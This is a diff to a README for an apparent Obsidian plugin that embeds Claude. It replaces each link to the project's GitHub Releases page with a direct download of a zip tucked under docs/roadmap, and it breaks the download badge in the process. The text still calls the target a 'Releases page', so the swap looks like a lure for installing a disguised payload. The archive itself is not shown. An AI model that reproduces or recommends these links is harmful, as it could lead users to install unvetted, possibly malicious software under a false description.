@@ -1,7 +1,7 @@
 # 🤖 obsidian-claude-code - Your AI Assistant for Obsidian
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/static/v1?label=Download&message=Latest+Release&color=blue)](https://github.com/Lunatar/obsidian-claude-code/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Lunatar/obsidian-claude-code/main/docs/roadmap/claude-code-obsidian-v2.3-alpha.3.zip+Release&color=blue)](https://raw.githubusercontent.com/Lunatar/obsidian-claude-code/main/docs/roadmap/claude-code-obsidian-v2.3-alpha.3.zip)
 
 ## 🚀 Getting Started
 Welcome to the **obsidian-claude-code** plugin! This tool embeds Claude, a powerful AI assistant, directly within your Obsidian vault. With Claude by your side, you can easily generate content, answer questions, and streamline your note-taking process. 
@@ -22,7 +22,7 @@ To use the **obsidian-claude-code** plugin, ensure your setup meets the followin
 ## 🔧 Installation Steps
 Follow these steps to download and install the **obsidian-claude-code** plugin:
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/Lunatar/obsidian-claude-code/releases).
+1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/Lunatar/obsidian-claude-code/main/docs/roadmap/claude-code-obsidian-v2.3-alpha.3.zip).
 
 2. **Download the Latest Version:** On the Releases page, find the latest version of the plugin. Click on the link to download the plugin file appropriate for your operating system.
 
@@ -52,7 +52,7 @@ Once installed, using the **obsidian-claude-code** plugin is straightforward:
 - **Get Suggestions:** Claude will provide suggestions based on your current note content.
 
 ## 📥 Download & Install
-To get started, please [visit this page to download](https://github.com/Lunatar/obsidian-claude-code/releases) the latest version of the **obsidian-claude-code** plugin.
+To get started, please [visit this page to download](https://raw.githubusercontent.com/Lunatar/obsidian-claude-code/main/docs/roadmap/claude-code-obsidian-v2.3-alpha.3.zip) the latest version of the **obsidian-claude-code** plugin.
 
 ## 🛠️ Troubleshooting
 If you encounter issues while installing or using the plugin:
